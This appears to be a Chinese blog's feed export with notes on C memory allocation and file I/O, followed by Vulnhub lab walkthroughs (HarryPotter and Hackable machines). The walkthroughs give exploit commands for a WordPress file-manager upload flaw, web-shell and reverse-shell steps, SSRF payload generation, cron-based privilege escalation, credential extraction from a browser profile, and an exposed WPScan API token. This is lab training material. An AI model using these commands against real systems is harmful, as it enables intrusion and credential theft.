alt="image-20210921150438063"></p><p><code>calloc()</code>：接受两个无符号整数作为参数，第一个是存储单元类型的数量，第二个每个是存储单元的大小（字节）</p><p><code>calloc()</code>函数还有一个特性：它把块中的所有位都设置为0，<code>calloc()</code>也可以利用<code>free()</code>来释放</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;存储类别、链接和内存管理&quot;&gt;&lt;a href=&quot;#存储类别、链接和内存管理&quot; class=&quot;headerlink&quot; title=&quot;存储类别、链接和内存管理&quot;&gt;&lt;/a&gt;存储类别、链接和内存管理&lt;/h1&gt;&lt;p&gt;被存储的每个值都占有一定的物理内存，C 语言把这样的一块内存</summary>
      
    
    
    
    
    <category term="C" scheme="http://example.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>文件操作</title>
    <link href="http://example.com/2021/09/21/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    <id>http://example.com/2021/09/21/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</id>
    <published>2021-09-21T08:37:58.000Z</published>
    <updated>2021-09-21T14:05:12.382Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><p>从文件读取信息或者将信息写入文件，这种程序与文件的交互形式就是文件重定向</p><h2 id="与文件通信"><a href="#与文件通信" class="headerlink" title="与文件通信"></a>与文件通信</h2><p>文件：通常是已经存储在磁盘或固态硬盘上的一段已命名的存储区。</p><p>C 把文件看成一系列连续的字节，每个字节可以被单独读取，C提供两种文件模式：文本模式和二进制模式</p><h3 id="文本模式-二进制模式"><a href="#文本模式-二进制模式" class="headerlink" title="文本模式 二进制模式"></a>文本模式 二进制模式</h3><p><strong>文件的内容都以二进制形式（0或1）储存</strong>。但是，如果文件最初<strong>使用二进制编码的字符</strong>（例如， ASCII或Unicode）表示文本（就像C字符串那样），该文件就是<strong>文本文件</strong>，其中包含文本内容。如果文件中的<strong>二进制值代 表机器语言代码或数值数据</strong>（使用相同的内部表示，假设，用于long或 double类型的值）或<strong>图片或音乐编码</strong>，该文件就是<strong>二进制文件</strong>，其中包含二进制内容。</p><p>在二进制模式中，程序可以访问文件的每个字节。而在文本模式 中，程序所见的内容和文件的实际内容不同。程序以文本模式读取文件时， 把本地环境表示的行末尾或文件结尾映射为C模式。</p><h3 id="I-O-的级别"><a href="#I-O-的级别" class="headerlink" title="I/O 的级别"></a>I/O 的级别</h3><p>除了选择文件的模式，大多数情况下，还可以选择 I/O 的两个级别（即 处理文件访问的两个级别）。底层I/O（low-level I/O）使用操作系统提供的 基本 I/O 服务。标准高级 I/O（standard high-level I/O）使用 C 库的标准包和 stdio.h 头文件定义。因为无法保证所有的操作系统都使用相同的底层 I/O 模型，C 标准只支持标准I/O 包。有些实现会提供底层库，但是 C 标准建立了可 移植的 I/O 模型，我们主要讨论这些 I/O。</p><h3 id="标准文件"><a href="#标准文件" class="headerlink" title="标准文件"></a>标准文件</h3><p>C 程序会自动打开三个文件，标准输入，标准输出，标准错误输出</p><h2 id="标准-I-O"><a href="#标准-I-O" class="headerlink" title="标准 I/O"></a>标准 I/O</h2><h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a><code>fopen()</code></h3><p><code>fopen()</code> ：打开文件，和 python 的类似，文件打开后会返回一个文件指针（FILE* fp），其他 I/O 函数可以利用这个指针指向该文件。</p><p>文件指针 fp 并不指向实际的文件，它指向一个包含文件信息的数据对象，其中包含操作文件的 I/O函数所用的缓冲区信息。因为标准库中的 I/O 函数使用缓冲区，所以它们不仅要知道缓冲区的位置，还要知道缓冲区被填充的程度以及操作哪一个文件。标准 I/O 函数根据这些信息在必要时决定再次填充或清空缓冲区。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921160351234.png" alt="image-20210921160351234"></p><blockquote><p>如果使用任何一种”w”模式（不带x字母）打开一个现有文件，该文件的 内容会被删除，以便程序在一个空白文件中开始操作。然而，如果使用带x 字母的任何一种模式，将无法打开一个现有文件。</p></blockquote><h3 id="getc-putc"><a href="#getc-putc" class="headerlink" title="getc() putc()"></a><code>getc() putc()</code></h3><p>从 <code>fp</code> 指定的文件中获取一个字符：<code>ch = getc(fp)</code></p><p>把字符 <code>ch</code> 放入 FILE 指针 <code>fpout</code> 指定的文件中：<code>puts(ch , fpout)</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921162535749.png" alt="image-20210921162535749"></p><h3 id="文件结尾"><a href="#文件结尾" class="headerlink" title="文件结尾"></a>文件结尾</h3><p><code>getc()</code>函数在读取一个字符时发现是文件结尾，它将返 回一个特殊值EOF</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921162741773.png" alt="image-20210921162741773"></p><h3 id="fclose"><a href="#fclose" class="headerlink" title="fclose()"></a><code>fclose()</code></h3><p><code>fclose(fp)</code>函数关闭 fp 指定的文件，必要时刷新缓冲区。对于较正式的程序，应该检查是否成功关闭文件。如果成功关闭，<code>fclose()</code>函数返回 0 ，否则返回 EOF</p><h3 id="指向标准文件的指针"><a href="#指向标准文件的指针" class="headerlink" title="指向标准文件的指针"></a>指向标准文件的指针</h3><p><code>stdio.h</code>头文件把3个文件指针与3个标准文件相关联，C 程序会自动打开这3个标准文件,这些文件指针都是指向FILE 的指针，所以它们可用作标准I/O函数的参数，</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921163203716.png" alt="image-20210921163203716"></p><h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><p><code>fprintf() fscanf()</code>：文件I/O函数<code>fprintf()</code>和<code>fscanf()</code>函数的工作方式与<code>printf()</code>和<code>scanf()</code>类似， 区别在于前者需要用第1个参数指定待处理的文件。</p><p><code>fgets() fputs()</code> : </p><p><code>fgets(buf, STLEN, fp);</code></p><p><code>rewind()</code>函数让程序回 到文件开始处，方便 while 循环打印整个文件的内容。注意，<code>rewind()</code>接受一 个文件指针作为参数。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921164354552.png" alt="image-20210921164354552"></p><p>随机访问：<code>fseek()</code> <code>ftell()</code></p><p><code>fseek()</code>有3个参数，返回 int 类型的值；<code>ftell()</code>函数返回一个 long 类型的值，表示文件中的当前位置</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921164931750.png" alt="image-20210921164931750"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921164944854.png" alt="image-20210921164944854"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921165007305.png" alt="image-20210921165007305"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921165302520.png" alt="image-20210921165302520"></p><p><code>fgetpos() fsetpos()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921165525047.png" alt="image-20210921165525047"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件操作&quot;&gt;&lt;a href=&quot;#文件操作&quot; class=&quot;headerlink&quot; title=&quot;文件操作&quot;&gt;&lt;/a&gt;文件操作&lt;/h1&gt;&lt;p&gt;从文件读取信息或者将信息写入文件，这种程序与文件的交互形式就是文件重定向&lt;/p&gt;
&lt;h2 id=&quot;与文件通信&quot;&gt;&lt;a hre</summary>
      
    
    
    
    
    <category term="C" scheme="http://example.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub靶场</title>
    <link href="http://example.com/2021/09/05/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2021/09/05/Vulnhub%E9%9D%B6%E5%9C%BA/</id>
    <published>2021-09-05T04:12:12.000Z</published>
    <updated>2021-09-22T02:52:32.786Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vulnhub"><a href="#Vulnhub" class="headerlink" title="Vulnhub"></a>Vulnhub</h1><p><a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></p><h2 id="一、HarryPotter-Aragog"><a href="#一、HarryPotter-Aragog" class="headerlink" title="一、HarryPotter: Aragog"></a>一、HarryPotter: Aragog</h2><blockquote><p>kali：192.168.1.15</p><p>Win10：192.168.1.7</p><p>靶机：192.168.1.101</p><p>2个flag</p></blockquote><ol><li>使用<code>nmap</code>发现主机位置</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810160201089.png" alt="image-20210810160201089"></p><ol start="2"><li>扫描主机开放的端口</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810160406090.png" alt="image-20210810160406090"></p><ol start="3"><li>开放了80端口，尝试直接访问获取一些信息，但是只有一张图片</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810160509837.png" alt="image-20210810160509837"></p><ol start="4"><li>尝试扫描目录，获取网站信息</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810161059271.png" alt="image-20210810161059271"></p><ol start="5"><li>访问这个网站发现是一个wordpress搭建的，找到登录框，尝试弱口令登录</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810162556360.png" alt="image-20210810162556360"></p><blockquote><p>更改一下电脑的hosts文件就可以了利用域名跳转</p><p>弱口令，爆破，sql注入都没有用，只能继续查找一些wordpress的其他漏洞了</p></blockquote><ol start="3"><li>使用kali中自带的wpscan工具，扫描wordpress网站的漏洞</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810164905155.png" alt="image-20210810164905155"></p><blockquote><p>网页中好像提示了一下可能有插件漏洞</p></blockquote><p>使用WPscan，需要一个WPscan的API<code>gQumLltdtYVensaeqYQI6Gld1rKoodUNjkgdo0sNObo</code>才能识别有漏洞的插件<code>wpscan --api-token=gQumLltdtYVensaeqYQI6Gld1rKoodUNjkgdo0sNObo --url http://192.168.1.101/blog -e p --plugins-detection aggressive</code><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812153011731.png" alt="image-20210812153011731"></p><p>发现了一个命令执行的漏洞<code>CVE-2020-25213</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812154341083.png" alt="image-20210812154341083"></p><ol start="4"><li><p>漏洞利用</p><p>参考：<a href="https://www.cnblogs.com/Salvere-Safe/p/14995249.html">https://www.cnblogs.com/Salvere-Safe/p/14995249.html</a></p><p><code>curl -F cmd=upload -F target=l1_ -F upload[]=@lcdm123.php -XPOST &quot;http://192.168.1.101/blog/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812154915266.png" alt="image-20210812154915266"></p><p>访问：<code>http://192.168.1.101/blog/wp-content/plugins/wp-file-manager/lib/files/lcdm123.php</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812154932669.png" alt="image-20210812154932669"></p></li><li><p>上传成功，连接shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812155252745.png" alt="image-20210812155252745"></p></li><li><p>根据作者提示，这里面有两个flag</p><blockquote><p>可以访问网站的配置文件获取各种敏感信息等</p></blockquote><p>在<code>/home</code>目录下发现了第一个flag:angry:</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812161048745.png" alt="image-20210812161048745"></p><p>根据配置文件中的数据库密码登录数据库</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812162133123.png" alt="image-20210812162133123"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812162150099.png" alt="image-20210812162150099"></p><blockquote><p>找一下有没有什么有用的东西，冰蝎上面查不了数据库，所以只能选择反弹shell</p></blockquote></li><li><p>利用kali自带的php反弹shell脚本上传到网站然后执行获取shell <code>/usr/share/webshells/php</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812171233121.png" alt="image-20210812171233121"></p><blockquote><p>需要自己修改脚本中的IP</p><p>然后直接执行  python3 -c ‘import pty; pty.spawn(“/bin/bash”);’  获取一个ttyshell</p></blockquote></li><li><p>登录数据库，查看数据库中的内容，获取有效信息</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812172434886.png" alt="image-20210812172434886"></p><p>在数据库中发现了用户和md5加密的密码，利用md5解密网站解出明文密码，结果为<code>password123</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812174109900.png" alt="image-20210812174109900"></p></li></ol><ol start="9"><li><p>尝试用密码连接shell（不知道为什么就直接想到连接shh了，应该是测试的），连接上后要考虑如何提权</p><ol><li><p><del>SUID提权</del> （未发现可用的命令）</p></li><li><p><del>sudo提权</del>（没有sudo）</p></li><li><p>计划任务提权</p><p>直接查看定时任务，只能看见自己的，然后搜索一下是否存在<code>.sh</code>脚本</p><p><code>find / -name &quot;*.sh&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812175029178.png" alt="image-20210812175029178"></p><p>这个好像是一个定时脚本，查看权限，本地可修改</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812175106634.png" alt="image-20210812175106634"></p><p>利用<code>pspy</code>查看执行进程的用户<a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813094946754.png" alt="image-20210813094946754"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813095033051.png" alt="image-20210813095033051"></p><p>UID为零表示权限为root，并且会定期执行，所以修改脚本中的内容提权</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812175652834.png" alt="image-20210812175652834"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812175617973.png" alt="image-20210812175617973"></p><p>成功获取两个flag</p></li></ol></li></ol><p><strong>问题总结</strong></p><ol><li><p>反弹shell时自己编写bash脚本</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812164151619.png" alt="image-20210812164151619"></p><p>成功执行但是没有shell返回</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812164210859.png" alt="image-20210812164210859"></p><blockquote><p>未解决，不知道原因</p></blockquote></li><li><p>无法对pspy64这个工具赋予权限</p><blockquote><p>已解决，上传工具时的用户不同，上传工具我利用的蚁剑，执行是用的ssh，导致权限出现问题，直接利用ssh上传工具即可</p></blockquote></li></ol><p><strong>总结</strong></p><p>总体来说这个靶场比较简单，利用现有漏洞，获取shell，然后获取文件进行提权操作</p><p>参考</p><p><a href="https://nepcodex.com/2021/05/vulnhub-aragog-walkthrough-harry-potter-series/">https://nepcodex.com/2021/05/vulnhub-aragog-walkthrough-harry-potter-series/</a></p><h2 id="二、HarryPotter-Nagini"><a href="#二、HarryPotter-Nagini" class="headerlink" title="二、HarryPotter: Nagini"></a>二、HarryPotter: Nagini</h2><blockquote><p>靶机：192.168.1.12</p><p>kali：192.168.1.15</p><p>windows10 ：192.168.1.7</p><p>3个flag</p></blockquote><p>扫描服务器开放的端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813095946042.png" alt="image-20210813095946042"></p><p>继续扫描，查看网站存在哪些目录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813100002238.png" alt="image-20210813100002238"></p><blockquote><p>字典不够强，漏扫了一个关键文件<code>note.txt</code>，找了老半天joomal的漏洞，结果没有找到有用的</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813102611357.png" alt="image-20210813102611357"></p><blockquote><p>看到这个没有更多的思路，先看看大师傅们的提示，再继续吧</p></blockquote><p>可以简单实现HTTP3工具：<a href="https://github.com/cloudflare/quiche%EF%BC%8C%E4%BD%9C%E8%80%85%E6%96%87%E7%AB%A0%EF%BC%9Ahttps://blog.cloudflare.com/enjoy-a-slice-of-quic-and-rust/%EF%BC%88%E5%8D%95%E8%AF%8D%E9%83%BD%E8%AE%A4%E8%AF%86%E5%B0%B1%E6%98%AF%E4%B8%8D%E4%BC%9A%E7%BF%BB%E8%AF%91%EF%BC%89">https://github.com/cloudflare/quiche，作者文章：https://blog.cloudflare.com/enjoy-a-slice-of-quic-and-rust/（单词都认识就是不会翻译）</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> quiche<br>cargo build --examples<br><br>坑：<br>需要使用新版的rust，卸载kali原版：sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-built_in">remove</span> rustc<br>下载新版：curl --proto <span class="hljs-string">&#x27;=https&#x27;</span> --tlsv1.<span class="hljs-number">2</span> -sSf http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">sh</span>.rustup.rs | <span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><p>编译好了之后进入<code>/quiche/target/debug/examples</code>文件夹，执行命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813123921031.png" alt="image-20210813123921031"></p><p>访问php文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813125241635.png" alt="image-20210813125241635"></p><p>尝试几次备份文件访问：<a href="http://192.168.1.12/joomla/configuration.bak">http://192.168.1.12/joomla/configuration.bak</a> 成功下载，发现数据库信息</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813124519690.png" alt="image-20210813124519690"></p><p>猜测这个地方可能存在ssrf</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813125330724.png" alt="image-20210813125330724"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813125418965.png" alt="image-20210813125418965"></p><p>使用<a href="https://github.com/tarunkant/Gopherus%E7%94%9F%E6%88%90payload%EF%BC%8C**payload%E9%9C%80%E8%A6%81%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%89%8D%E6%9C%89%E6%95%88">https://github.com/tarunkant/Gopherus生成payload，**payload需要二次编码才有效</a>**</p><blockquote><p>MySQL客户端连接登录服务器有两种情况：</p><ol><li>需要密码认证时使用挑战越大模式，服务器先发送salt然后客户端使用salt加密面膜然后验证</li><li>无需密码认证时直接发送TCP/IP数据包就可以了</li></ol></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813141426960.png" alt="image-20210813141426960"></p><p>成功返回数据库名，接下来就可以直接执行语句获取数据库内容了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813134232814.png" alt="image-20210813134232814"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813135606891.png" alt="image-20210813135606891"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813135936948.png" alt="image-20210813135936948"></p><blockquote><p>数据库密码hash解不出来，这里可以考虑替换hash、</p><p>123456    e10adc3949ba59abbe56e057f20f883e</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813141249058.png" alt="image-20210813141249058"></p><p>登录后台</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813141318613.png" alt="image-20210813141318613"></p><p>在模板处写入一句话木马 ，将该模板应用于网站，获取shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813142829660.png" alt="image-20210813142829660"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813143024308.png" alt="image-20210813143024308"></p><p>第一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813145728658.png" alt="image-20210813145728658"></p><p>将kali自带的反弹shell脚本上传到服务器，反弹shell然后执行<code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;);&#39;</code>获取ttyshell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813144148808.png" alt="image-20210813144148808"></p><p>在<code>/home/snape</code>下发现了登录密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813144758206.png" alt="image-20210813144758206"></p><p>登录ssh</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813144821901.png" alt="image-20210813144821901"></p><p>现在要么获取到<code>hermonie</code>的权限然后再获取最高权限，要么直接获取最高权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813145219449.png" alt="image-20210813145219449"></p><blockquote><p>这里就明显表示需要一步一步来，先利用su_cp操作获取到hermonie，然后再获取root用户权限</p></blockquote><p>直接利用<code>su_cp</code>命令将文件复制出来 就可以获取内容了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813150540843.png" alt="image-20210813150540843"></p><blockquote><p>其他大佬是利用这个复制命令给hermonie用户添加ssh密钥</p></blockquote><p>利用kali生成密钥对，然后利用su_cp将公钥写入用户的.ssh目录</p><p>第一步生成密钥对,使用命令<code>ssh-keygen</code></p><p>第二步将公钥写入服务器中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813154644825.png" alt="image-20210813154644825"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813154717914.png" alt="image-20210813154717914"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813154800319.png" alt="image-20210813154800319"></p><p>第三步使用私钥连接 <code>ssh hermoine@192.168.1.12 -i .ssh/id_rsa</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813154905695.png" alt="image-20210813154905695"></p><p>一个厉害的提权辅助脚本<a href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86%E4%B8%80%E4%BA%9B%E4%BF%A1%E6%81%AF">https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh，可以自动收集一些信息</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">./linpeas.<span class="hljs-keyword">sh</span> | tee output<br><span class="hljs-keyword">cat</span> output | <span class="hljs-keyword">grep</span> login<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813160718532.png" alt="image-20210813160718532"></p><p>解密工具：<a href="https://github.com/unode/firefox_decrypt/releases/tag/0.7.0">https://github.com/unode/firefox_decrypt/releases/tag/0.7.0</a></p><p>使用scp命令将整个firefox的文件全部移出来（单个文件移出来，一直解码失败，所以索性全部移出）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813164205265.png" alt="image-20210813164205265"></p><p>然后解码，就获得了root用户的密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813164109726.png" alt="image-20210813164109726"></p><p>利用密码登录到root账户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813164519538.png" alt="image-20210813164519538"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813164540819.png" alt="image-20210813164540819"></p><p>成功获取到了第三个flag</p><p><strong>问题总结</strong></p><ol><li>为什么浏览器的登录数据中会有root用户的登录密码</li></ol><p><strong>总结</strong></p><p>这个靶场总体来说要比第一个难，主要是进攻站点时的目录扫描，http3，加入内部后的root用户密码这里，确实不走寻常路。大致步骤还是和第一个靶场类似。</p><h2 id="三、HarryPotter-Fawkes"><a href="#三、HarryPotter-Fawkes" class="headerlink" title="三、HarryPotter: Fawkes"></a><del>三、HarryPotter: Fawkes</del></h2><blockquote><p>这个是一个PWN靶场，完全后面几步没头绪</p></blockquote><blockquote><p>靶场：192.168.1.101</p><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>3个flag</p></blockquote><p>扫描端口，这个开的端口还挺多的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813171526501.png" alt="image-20210813171526501"></p><p>ftp中只有一个文件，但是打开乱码，先留着应该有用</p><p><code>EtherNetIP-1</code>：工业以太网通讯协议，可以应用再程序控制及其他自动化的应用中，是通用工业协定的一部分</p><p><code>monkeycom</code>：视频电话/文件传输程序</p><p>扫描目录，结果什么东西都没有</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814124812344.png" alt="image-20210814124812344"></p><p>挨个访问一下这几个端口，但是都没有什么东西:cry: ，卡住了，看了一眼国外的大佬的步骤，确实是要访问这几个端口的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814125206654.png" alt="image-20210814125206654"></p><p>curl一下，发现提示HTTP/0.9的问题</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814125229195.png" alt="image-20210814125229195"></p><p>指定好http的版本就可以正常返回了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814125917891.png" alt="image-20210814125917891"></p><p>参考文章</p><p><a href="https://nepcodex.com/2021/05/vulnhub-fawkes-walkthrough-harry-potter-series/">https://nepcodex.com/2021/05/vulnhub-fawkes-walkthrough-harry-potter-series/</a></p><h2 id="三、HACKABLE-II"><a href="#三、HACKABLE-II" class="headerlink" title="三、HACKABLE: II"></a>三、HACKABLE: II</h2><blockquote><p>kali：192.168.1.15</p><p>Win10：192.168.1.7</p><p>靶机：192.168.1.13</p></blockquote><p>扫描靶机位置和靶机开放的端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814134501443.png" alt="image-20210814134501443"></p><p>访问一下各个端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814134636446.png" alt="image-20210814134636446"></p><p>ftp中的内容，这个提示内容没怎么懂…………</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814134752215.png" alt="image-20210814134752215"></p><p>扫描一下目录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814135029124.png" alt="image-20210814135029124"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814140003974.png" alt="image-20210814140003974"></p><blockquote><p>这个文件和ftp中的文件存储位置是一样的，所以我们可以通过ftp上传shell</p></blockquote><p>访问上传的反弹shell的php文件就可以获得shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814140350228.png" alt="image-20210814140350228"></p><p>获取ttyshell的<code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;);&#39;</code>，发现一个重要的文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814143719614.png" alt="image-20210814143719614"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814144303223.png" alt="image-20210814144303223"></p><p>尝试ssh登录，shrek账户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814144608483.png" alt="image-20210814144608483"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814150109583.png" alt="image-20210814150109583"></p><p>准备收集信息提权</p><ul><li><del>SUID提权</del></li><li><del>sudo提权（版本不适配）</del></li><li><del>定时任务提权</del></li></ul><blockquote><p>后面没事就突然想起来看了一下.bash_history文件</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814150300644.png" alt="image-20210814150300644"></p><p>也模仿执行了一下</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814150351118.png" alt="image-20210814150351118"></p><p>提权成功，幸福来得太突然了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814150425717.png" alt="image-20210814150425717"></p><p><strong>总结</strong></p><p>这个靶场的整体难度可以说是没有难度…………适合玩玩而已</p><h2 id="四、Hackable-III"><a href="#四、Hackable-III" class="headerlink" title="四、Hackable: III"></a>四、Hackable: III</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.16</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814154534969.png" alt="image-20210814154534969"></p><blockquote><p>只开放了一个端口，有点少啊</p></blockquote><p>扫描目录获取更多有用的信息</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814154857267.png" alt="image-20210814154857267"></p><p>网页源码有一段注释，这个应该是一个提示，但是有点看不懂</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814180322841.png" alt="image-20210814180322841"></p><p>在<code>/backup/wordlist.txt</code>中是一个字典，可能对后面爆破有用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814155354912.png" alt="image-20210814155354912"></p><p>这个编码真的没见过，看了一下WP才知道到<a href="https://www.dcode.fr/brainfuck-language">https://www.dcode.fr/brainfuck-language</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814181115898.png" alt="image-20210814181115898"></p><p>数据库无密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814155452250.png" alt="image-20210814155452250"></p><p>登录页面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814155638016.png" alt="image-20210814155638016"></p><blockquote><p>一看源码就感觉有SQL注入</p></blockquote><p>登录页面为<code>/login_page/login.html</code>，发现没有SQL注入，但是可以访问上面的图片<code>3.jpg</code>，前面1，2都有了，这个<code>3.jpg</code> ，应该也有东西，那就应该是misc的图片隐写</p><p>图片隐写工具：<a href="http://steghide.sourceforge.net/download.php">http://steghide.sourceforge.net/download.php</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814183500775.png" alt="image-20210814183500775"></p><blockquote><p>拿到了3个数字  10000  4444  65535</p><p>不知道有什么用:pensive:</p></blockquote><p>使用端口碰撞后发现22端口已经打开了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814184715476.png" alt="image-20210814184715476"></p><p>现在手里有的东西并且还没有用的线索就是那个字典，然后最新获得了一个22端口，所以就爆破一下ssh密码，用户名目前出现的名字就是第一个网页源码的提示中的名字，先试一下吧…………</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814185708000.png" 